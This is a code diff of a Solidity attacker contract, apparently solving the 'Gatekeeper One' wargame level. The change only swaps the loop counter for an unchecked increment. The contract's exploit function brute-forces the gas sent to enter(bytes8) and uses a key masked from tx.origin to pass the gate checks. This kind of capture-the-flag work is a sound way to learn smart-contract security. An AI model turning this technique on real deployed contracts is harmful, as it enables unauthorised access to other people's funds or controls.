@@ -28,13 +28,16 @@ contract GatekeeperOneAttacker {
     }
 
     function exploit() public {
-        for (uint256 i = 0; i < 300; i++) {
+        for (uint256 i = 0; i < 300; ) {
             bytes8 key = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF;
             (bool success, ) = address(gatekeeper).call{gas: i + (8191 * 3)}(
                 abi.encodeWithSignature("enter(bytes8)", key)
             );
             if (success) {
                 break;
+            }
+            unchecked {
+                ++i;
             }
         }
     }
